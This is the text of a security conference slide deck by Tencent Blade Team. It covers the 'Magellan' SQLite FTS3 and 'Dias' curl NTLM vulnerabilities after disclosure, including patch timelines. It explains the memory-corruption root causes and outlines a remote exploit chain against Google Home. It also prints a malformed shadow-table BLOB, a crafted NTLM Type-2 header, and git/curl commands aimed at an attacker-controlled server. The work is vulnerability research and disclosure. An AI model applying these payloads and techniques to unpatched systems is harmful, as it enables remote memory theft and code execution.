Exploring the New World : Remote Exploitation of SQLite and Curl
Wenxiang Qian, Yuxiang Li, Huiyu Wu Tencent Blade Team

About Us
Wenxiang Qian (@leonwxqian) Senior security researcher at Tencent Blade Team. Focus on browser security & IoT security Interested in code auditing. Security book author, Speaker of DEF CON 26, CSS 2019
YuXiang Li (@Xbalien29) Senior security researcher at Tencent Blade Team. Focus on mobile security and IoT security Reported multiple vulnerabilities of Android. Speaker of HITB AMS 2018, XCON 2018, CSS 2019
HuiYu Wu (@NickyWu_) Senior security researcher at Tencent Blade Team Bug hunter, Winner of GeekPwn 2015. Speaker of DEF CON 26 , HITB 2018 AMS and POC 2017

About Tencent Blade Team
· Founded by Tencent Security Platform Department in 2017 · Focus on security research in the areas of AIoT, mobile devices, cloud virtualization,
blockchain, etc · Reported 200+ vulnerabilities to vendors such as Google, Apple, Microsoft, Amazon · Blog: https://blade.tencent.com

Agenda
· Introduction · Fuzzing and Manual Audit SQLite & Curl · Remote Exploitation of Magellan and Dias · Conclusion

Introduction

Why SQLite and Curl?
· 3rd party libraries are always sweet.
· Almost every device had them installed, hadn't they?
· Google Home or Google Chrome are using them too.
· WebSQL makes remote attack via SQLite available in Chrome · Curl was born to be working remotely

Magellan
CVE-2018-20346 / CVE-2018-20505 / CVE-2018-20506 Remote exploit target : Google Home with Chrome
Dias
CVE-2018-16890 / CVE-2019-3822 Remote exploit target : Apache + PHP / Git

Fuzzing and Manual Auditing SQLite & Curl

Previous Researches
· Michal Zalewski -- AFL: Finding bugs in SQLite, the easy way
· http://lcamtuf.blogspot.jp/2015/04/finding-bugs-in-sqlite-easyway.html
· BH US-17 -- "Many Birds, One Stone: Exploiting a Single SQLite Vulnerability Across Multiple Software"
· https://www.blackhat.com/docs/us-17/wednesday/us-17-FengMany-Birds-One-Stone-Exploiting-A-Single-SQLite-VulnerabilityAcross-Multiple-Software.pdf

Fuzzing the SQLite
· Nothing interesting, but crashes of triggering asserts · Accidently noticed Magellan when debugging those crashes · Raw testcase triggers the crash (beautified):
· What's those a02_content , a02_segdir, a02_segments?

Shadow Tables
· %_content %_segdir %_segments %_stat %_docsize for FTS3/4, % is replaced by table name
· Accessible (read, write, delete) like standard tables
· FTS3/4/5, RTREE use shadow tables to store content

Wait... Is that a Backing-store?

BLOBs
· Representation of binary data:
x41414242 =AABB
· In shadow tables ...
· They are serialized data structures (BTREEs...) · Wrong deserialization are often the causes of problems

Nodes (BLOBs) Definitions
· Segment B-Tree Leaf Nodes
· Doclist Format

Find those Related Code Paths which are ...
· ... parsing or deserializing data from shadow tables · ... manipulating those BTREE nodes · ... playing with the risky APIs: memmove/memcpy...

Overview of `Magellan`
· CVE-2018-20346 `merge` of FTS3 caused memory corruption · CVE-2018-20506 `match` of FTS3 caused memory corruption · CVE-2018-20505 `merge` of FTS3 caused memory corruption(2) · SQLite ticket: 1a84668dcfdebaf1
Assertion fault due to malformed PRIMARY KEY
· Information and restrictions: https://blade.tencent.com/magellan/

CVE-2018-20346
· In fts3AppendToNode
· Trigger it by "merge":
INSERT INTO X(X) VALUES ("merge=1,2")
· Function tries to append a node to another
· Nodes are parsed from BLOBs
· The memcpy in LN310 seems vulnerable.

CVE-2018-20346
· fts3TruncateNode get the node being processed · Node information is returned in reader object · Easily bypass fts3TermCmp check by modifying the shadow table · Control aDoclist and nDoclist in reader, to trigger the problem
int fts3AppendToNode(...){ ... memcpy(target, aDoclist, nDoclist);
}

CVE-2018-20346
· In nodeReaderNext · LN114: iOff is a "pointer" to BLOB · LN120: Read compromised data,
make iOff go beyond the current blob data. · LN122: nDoclist is controllable. · LN123: Got an aDoclist points to the last char of the blob after nodeReaderNext finishes. · LN129: assert won't stop the iOff · Now we've controlled nDoclist and aDoclist!

iOff @ LN120

......

Length

Data

Length

Boundary

CVE-2018-20346
· Back to fts3AppendToNode · aDocList and nDoclist is controlled
· LN310:
· Heap buffer overflow, if nDoclist > align(buflen(pNode->a))
· Raw memory leak (OOB Read), if nDoclist < align(buflen(pNode->a))

CVE-2018-20506
· In fts3ScanInteriorNode
· Trigger it by "match":
SELECT * FROM X WHERE A MATCH `1';
· Modify the shadow table, set a node in %_segdir to a non-root node.
· Modify blob of that node.
· Call `match` to trigger the exploit.

CVE-2018-20506
· LN169: (32-bit) zCsr[nSuffix] will often wraps the 32-bit address when nSuffix is very large, and pass the check.
Eg: zCsr(0xA000 0001) + nSuffix(0x7fff ffff)  0x2000 0000
· LN173: Big nSuffix + Small nPrefix integer overflow. All of them are signed int.
Eg: 0x7fffffff nSuffix + 0x1 nPrefix < 0x5 nAlloc
· LN184: Large nSuffix = heap buffer overflow
· Or.. make nPrefix very large (with a small nSuffix), then write OOB in LN184.

CVE-2018-20506
· Many constrained conditions · Considered to be hard to exploit · But exploitable anyway

CVE-2018-20505
· In fts3SegReaderNext · A combination of 20346+20506 · pReader should be controlled first. · LN703: pNext is reading OOB from an
controlled aDoclist and nDoclist. · LN759: Set nSuffix to larger than
the remaining size of pNext. And a large nPrefix (optional). · If ...
· nPrefix + nSuffix integer overflows, LN766 : not ensuring a large enough buffer, LN779 : heap buffer overflow.
· nSuffix did not integer overflow, LN779 : leak raw memory after pNext.

Auditing the libcurl
· Target: Remote code execution
· Find BIG functions (which often have poor coding practice) · Protocol that communicates with remote machine (attacker)
· Attack vector: The simpler, the better. · Protocols fulfill our requirements:
FTP, HTTPS, NTLM over HTTP, SMTP, POP3, ...

NTLM over HTTP 6-stage "Handshake"

Example of a Type-2 Message
Message decoded from Base64

Overview of `Dias`
· CVE-2018-16890 NTLM Type-2 Message Information Leak
Leaking at most 64KB client memory per request to attacker, "client version Heartbleed".
· CVE-2019-3822 NTLM Type-3 Message Stack Buffer Overflow
Allow attacker to leak client memory via Type-3 response, or performs remote code execution through stack or heap buffer overflow.
"This is potentially in the worst case a remote code execution risk. I think this might be the worst security issue found in curl in a long time." (Daniel's blog)

CVE-2018-16890
· LN183: Curl_read32_le Set target_info_offset with a very large value.
Eg: offset=0xffff0001 (-65535) len=0xffff (65535)
· LN185: Integer overflow
· LN196: memcpy copies data OOB (backwards). Leaking at most 64KB data per request to attacker.

CVE-2019-3822
· LN519: ntlmbuf is a stack variant. · LN590: Read ntresplen from
Type-2 response. · LN779: Inexplicit signed/unsigned
cast, integer overflow · LN781: Stack buffer overflow.

CVE-2019-3822
· In Curl_ntlm_core_mk_ntlmv2_resp:
· #define NTLM_HMAC_MD5_LEN 16 · #define NTLMv2_BLOB_LEN (44 ­ 16 + ntlm->target_info_len + 4)
· ntresp_len is set by len

CVE-2019-3822
· Back to Curl_auth_create_ntlm_type3_message:
· size_t size, unsigned int ntresplen, and 1024 (signed)
if(UNSIGNED < (SIGNED - UNSIGNED)) { ... }  Inexplicit type cast (from signed to unsigned)
if(UNSIGNED < (UNSIGNED - UNSIGNED)) { ... }
· So, If size is 0x100, ntresplen is 1025 , (>1024) the result will be...
if (0x100 < 0xFFFFFFFF) { (PASSED) }

CVE-2019-3822
· Lots of stack variables following by ntlmbuf
· Stack buffer overflow happens in the middle of the function

LN492

LN781

LN862

Overwrite direction is related to compiler MSVC
GCC

Heap/Stack operations x 5 Many function calls uses stack variables here...

CVE-2019-3822
· May cause a heap buffer overflow here*
· Leak memory data to attacker (Base64ed later)
· Environment requirements
· Affects libcurl built with non-OpenSSL builds or OpenSSL builds with MD4 present, NTLM must be enabled to trigger this.
* Based on the implementation of Curl_convert_to_network

Remote Exploitation of Magellan and Dias

Remote Exploitation of Magellan
· The specific scope of Magellan · Chrome or browsers developed based on Chromium · Android Apps that uses WebView · Smart devices using Chrome or Chromium
· Why Google Home · The top two in the global market share · It's an IoT device and uses Chrome OS
· How to attack Google Home using Magellan ?

Extending the Attack Surface of Google Home
· The Overview of CAST Protocol
· Google Cast is designed for TV, movies, music, and more · Developers can develop the CAST APP and publish it to Application Store · Including sender (mobile devices or Chrome) and receiver (Google Home)

Extending the Attack Surface of Google Home
· Attack Surface of CAST Protocol
· The CAST app can be any webpage · The app in the app store may be malicious · Sender can directly trigger CAST protocol
Remote Attack Surface: Converting an attack on Google Home into an attack on a browser

Extending the Attack Surface of Google Home
· Detailed Steps: Extending the Remote Attack Surface · Register as a developer and post a malicious app · Remotely trigger Google Home to load malicious app
 Inducing victims to visit malicious sender URLs via Chrome  Sending the cast protocol to launch APP in LAN
· RCE in Google Home's renderer
locaton.href="http://192. 168.1.56/exp.html"

Exploiting the Magellan on Google Home
· Review the details of CVE-2018-20346 · Control pNode->a, pNode->n, aDoclist, nDoclist, via "update x_segdir set root=x'HEX'"

nDoclist: 256 (Varint)

00 04 31 32 33 34 02 00 00 00 01 01 01 00 01 01 01 01 00

80 02 01 01 80 02 aa aa aa aa aa

pNode->n: Buffer offset aDoclist[]: Overflow or Leak Memory

pNode->a[]: Heap Fengshui

Exploiting the Magellan on Google Home

· Available Function Pointer · simple_tokenizer is a structure on the heap
 create virtual table x using fts3 (a, b);
· The tokenizer's callback looks interesting

simple_tokenizer
base delim

sqlite3_tokenizer
pModule

(simple_tokenizer *) sqlite3_malloc(sizeof(*t));

tokenizer_modul e
iVersion xCreate xDestroy xOpen
...

Callback function

Exploiting the Magellan on Google Home

· PC Hijacking

· Operating FTS3 table after heap overflow · Hijacking before memory free

static int fts3TruncateSegment( Fts3Table *p, sqlite3_int64 iAbsLevel, int iIdx, const char *zTerm, int nTerm){

......

if( rc==SQLITE_OK ){

sqlite3_stmt *pChomp = 0;

rc = fts3SqlStmt(p, SQL_CHOMP_SEGDIR, &pChomp, 0);

if( rc==SQLITE_OK ){

......

rc = sqlite3_reset(pChomp);

sqlite3_bind_null(pChomp, 2);

Using the SQL TRIGGER to perform fts3 operations before

}

executing SQL_CHOMP_SEGDIR

}

sqlite3_free(root.a); sqlite3_free(block.a); }

Exploiting the Magellan on Google Home
· Heap Fengshui
· tmalloc as the heap management algorithm · Memory layout by operating fts3 tables · Hijacking PC via SQL TRIGGER
Create multiple fts3 tables

Drop the previous fts3 table
Reassigning payload Overwriting the simple_tokenizer

Triggers the operation of fts3 Calling xOpen via SQL TRIGGER

Hijacking PC R0 / R11 / PC can be controlled

Exploiting the Magellan on Google Home
· Bypass ASLR
· Try to adjust the nDoclist, pNode->a and leak the memory after heap · Leaking the address of cast_shell (For ROP gadgets) · Leaking the address of last heap (For heap spray)

Exploiting the Magellan on Google Home
· Heap Spray
· Insert into the table
· ROP
· Cast_shell's gadget
RCE in Google Home's renderer

Exploiting the Magellan on Google Home
· RCE in Google Home's renderer
Running shellcode to modify readonly "navigator.appName" to AAAA Hijacking PC via controlled R0/R11

Exploiting the Magellan on Google Home

1. Launch APPID=1

2. Loading Leak.html 4. Loading Exp.html
3. Launch APPID=2

Attacker

Visiting Sender URL

UPNP forwarding

APPID=1, Leak.html APPID=2, Exp.html

Cast Hack Attacker

Remote Exploitation of Dias

· The threat model of the developer scenario · Developers may also be targets of the attack · Essential tools may have security issues and proxy servers may also be attacked · Network-related third-party libraries will be an attack surface

PC/Server
Developer

Proxy Server

Attacker

ARP/DNS spoof Malicious service

Internet

Attacker

Remote Exploitation of Dias
· Review the details of Dias
· Information leak and stack overflow will be triggered by NTLM Type-2 message · Client's authentication information is not important
· NTLM Authentication for CURL/libcurl
· Curl supports NTLM by default · libcurl needs to enable CURLAUTH_NTLM or CURLAUTH_ANY

Remote Exploitation of Dias

· Detailed Scenarios (NTLM Authentication Request)

· Developers use git to pull the repositories

 Malicious repositories address
· Using curl or libcurl to access proxy servers

Developer

1. Initiate NTLM authentication 2. Malformed NTLM Type-2 3. Information Leak

Attacker

 Ntlm authentication server was compromised

Potential RCE

· Bad or backdoor PHP webpage on the server

 Hidden webshell and bad test cases

Remote Exploitation of Dias

· "Heartbleed" of the libcurl
· NTLM Type-2 message: '\nWWW-Authenticate: NTLM TlRMTVNTUAACAAAAQUFBQUFBQQAAAIAAzMzMzMzMzMwAAAAAAAAAAP8AAA AB////29vb2w==`

4E 54 4C 4D 53 53 50 00 02 00 00 00 41 41 41 41 41 41 41 00 00 00 80 00 CC CC CC CC CC CC CC CC

00 00 00 00 00 00 00 00 FF 00 00 00 01 FF FF FF

DB DB DB DB
memcpy(ntlm->target_info, &buffer[target_info_offset], target_info_len);

target_info_offset target_info_len

Remote Exploitation of Dias
· "Heartbleed" of the Client (Git and Curl)
· 127.0.0.1 was controlled by hacker · Developer uses git and curl do things
 Git clone http://aaa:bbb@127.0.0.1:8080/1.git  Curl --ntlm http://aaa:bbb@127.0.0.1:8080
· The leaked data will be responded to hacker

Remote Exploitation of Dias
· "Heartbleed" of the Server (Apache + PHP)
· The "webshell" may be a time-bomb (It's not easy to detect) · Memory leaks or potential RCE will occur
Respond to hackers

Conclusion

· Timeline
3rd Nov Reported to SQLite

Magellan
28th Nov Fixed in Chromium Defense In-Depth by SQLite

3rd Dec Chrome 71.0.3578.80 released

21st Dec CVEs assigned

1st Nov

5th Nov

Reported to Google Fixed by SQLite 3.25.3

· Enhancements

1st Dec SQLite 3.26.0 w/ Defense In-Depth

20th Dec $10337 Reward by Google

· SQLite introduced defense in-depth flag SQLITE_DBCONFIG_DEFENSIVE, disallowing modify

shadow tables from untrusted source.

· SQLITE_DBCONFIG_DEFENSIVE (default OFF in sqlite, for backwards compatibility) · Good News: default ON in Chrome from commit a06c5187775536a68f035f16cdb8bc47b9bfad24
· Google refactored the structured fuzzer, found many vulnerabilities in SQLite.

· Timeline

Dias

2nd Jan Confirmed by Curl

16th Jan 2 of 2 vulns fixed

6th Feb Curl 7.64.0 released

31st Dec Reported to Curl

3rd Jan 1 of 2 vulns fixed

30th Jan CVEs assigned

8th Feb Security page released

Responsible Disclosure
· Notified CNCERT to urge vendors disable the vulnerable FTS3 or WebSQL before the patch comes out (if they don't use these features).
· Notified security team of Apple, Intel, Facebook, Microsoft, etc. about how to fix the problem or how to mitigate the threats in some of their products.

Security Advice
· Enhance your system with the newest available defense in-depth mechanism in time · Keep your third-party libraries up-to-date · Improve the quality of security auditing and testing of third-party library · Introduce security specifications into development and testing

THANK YOU
https://blade.tencent.com

